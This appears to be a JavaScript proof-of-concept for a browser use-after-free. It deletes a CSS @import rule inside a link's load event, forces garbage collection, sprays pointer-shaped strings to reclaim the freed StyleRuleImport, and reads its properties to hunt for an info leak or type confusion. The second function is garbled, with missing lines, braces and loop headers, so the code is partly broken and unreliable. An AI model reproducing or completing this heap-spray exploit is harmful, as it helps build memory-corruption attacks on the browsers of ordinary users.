// ============================================================
// TEST 1: Basic @import reentrancy via <link>
// ============================================================
// <link rel="stylesheet" href="data:text/css,@import url(data:text/css,...)">
// When inner @import completes → checkLoaded() → load event on <link>
// Inside load: link.sheet.deleteRule(0) → frees StyleRuleImport
// ============================================================

function test1_basic_link_import() {
    Dm("Creating <link> with @import...");
    
    var link = document.createElement('link');
    link.rel = 'stylesheet';
    
    // Outer CSS contains @import to inner CSS
    var outerCSS = '@import url("data:text/css,body{color:red}")';
    link.href = 'data:text/css,' + encodeURIComponent(outerCSS);
    
    var loadFired = false;
    var deleteSucceeded = false;
    
    link.onload = function() {
        loadFired = true;
        Dm("  [load] Event fired!");
        
        try {
            var sheet = link.sheet;
            if (!sheet) {
                Wr("  [load] No sheet available");
                return;
            }
            
            Dm("  [load] sheet.cssRules.length = " + sheet.cssRules.length);
            
            if (sheet.cssRules.length > 0) {
                var rule = sheet.cssRules[0];
                Dm("  [load] Rule type: " + rule.constructor.name);
                Dm("  [load] Rule href: " + rule.href);
                
                // DELETE the @import rule — this should trigger the UAF
                Dm("  [load] Deleting rule 0...");
                sheet.deleteRule(0);
                deleteSucceeded = true;
                Ok("  [load] deleteRule() succeeded!");
                
                // If we get here without crash, check if rule is still accessible
                Dm("  [load] Accessing rule after delete...");
                try {
                    var href = rule.href;
                    Dm("  [load] rule.href after delete: " + href);
                } catch(e) {
                    Dm("  [load] rule.href error: " + e.message);
                }
            }
        } catch(e) {
            Fl("  [load] Error: " + e.message);
        }
    };
    
    document.head.appendChild(link);
    
    // Check after a delay
    setTimeout(function() {
        if (loadFired) {
            Ok("  Load event fired");
            if (deleteSucceeded) {
                St("  ★ deleteRule() during load callback succeeded!");
                Hi("  If browser didn't crash → UAF might be exploitable!");
            }
        } else {
            Wr("  Load event did NOT fire (data: URI might load synchronously)");
        }
    }, 2000);
}

function test4_import_spray_read() {

            // Delete the rule — frees StyleRuleImport if no other refs

            sheet.deleteRule(0);

            // Force GC to ensure the C++ object is freed
            Dm("  [load] Forcing GC (16MB)...");
            for (var i = 0; i < 4; i++) {
                var t = [];
                for (var j = 0; j < 128; j++) t.push(new ArrayBuffer(8192));
            }
            
            // Spray with strings to reclaim the freed memory
            Dm("  [load] Spraying strings...");
            var spray = [];
            for (var i = 0; i < 1000; i++) {
                // Create strings that look like pointers

                    0x41, 0x41, 0x41, 0x41,  // 0x41414141
                    0x00, 0x00, 0x00, 0x01,  // 0x01000000 (pointer-like)
                    0x42, 0x42, 0x42, 0x42,
                    0x00, 0x00, 0x00, 0x02

                spray.push(s);
            }
            
            // Now try to read properties through the saved reference
            // If the C++ StyleRuleImport was freed and reclaimed by our spray,
            // the getter will read from our controlled data
            
            Dm("  [load] Reading savedRule.href...");
            try {
                var href = savedRule.href;
                Hi("  [load] href = '" + href + "'");
                Hi("  [load] href length = " + href.length);
                
                // Check for non-ASCII (raw memory)
                var hasRaw = false;
                var hex = "";

                    var c = href.charCodeAt(i);

                    var h = c.toString(16);
                    hex += (h.length === 1 ? "0" + h : h) + " ";

                if (hasRaw) {
                    St("  ★ RAW MEMORY IN href — INFO LEAK!");

            } catch(e) {
                Fl("  [load] href error: " + e.message);

            Dm("  [load] Reading savedRule.styleSheet...");

                    St("  ★ styleSheet NOT null — possible type confusion!");
                }
            } catch(e) {
                Fl("  [load] styleSheet error: " + e.message);
            }
            
        } catch(e) {
            Fl("  [load] Error: " + e.message);
        }
    };
    
    document.head.appendChild(link);
}
